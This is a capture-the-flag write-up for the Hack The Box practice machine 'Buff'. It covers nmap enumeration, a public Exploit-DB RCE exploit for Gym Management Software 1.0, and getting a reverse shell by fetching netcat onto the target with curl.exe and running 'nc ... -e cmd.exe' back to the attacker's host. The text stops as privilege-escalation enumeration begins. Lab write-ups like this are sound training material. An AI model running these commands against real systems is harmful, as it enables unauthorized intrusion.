# Buff - Windows - 10.10.10.198

## Enumeration:

Nmap time:

```
nmap -sC -sV -Pn 10.10.10.198
```

Results:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 16:23 EST
Nmap scan report for 10.10.10.198
Host is up (0.059s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.50 seconds
```

We find an open port on port 8080, http, so we open the ip in a web browser.

After poking around the site, we find the following: *Made using Gym Management Software 1.0*.

Looking around for exploits, we find a remote code execution exploit at https://www.exploit-db.com/exploits/48506. Using this command with the site address allows for a webshell.

```
python 48506.py http://10.10.10.198:8080/
```

## Getting In:

From this webshell, we want a reverse shell.

First, I host a netcat binary from my local system:

```
python -m SimpleHTTPServer 80
```

Then I curled the netcat binary from it from the webshell:

```
curl.exe -o nc.exe ip
```

Then the listener system is setup:

```
sudo nc -lnvp 1338
```

We get the reverse shell now by netcatting from the windows webshell:

```
nc -nv ip 1338 -e cmd.exe
```

This gives us the reverse shell.

## Enumeration Part 2:

We're going to enumerate now with WinPEAS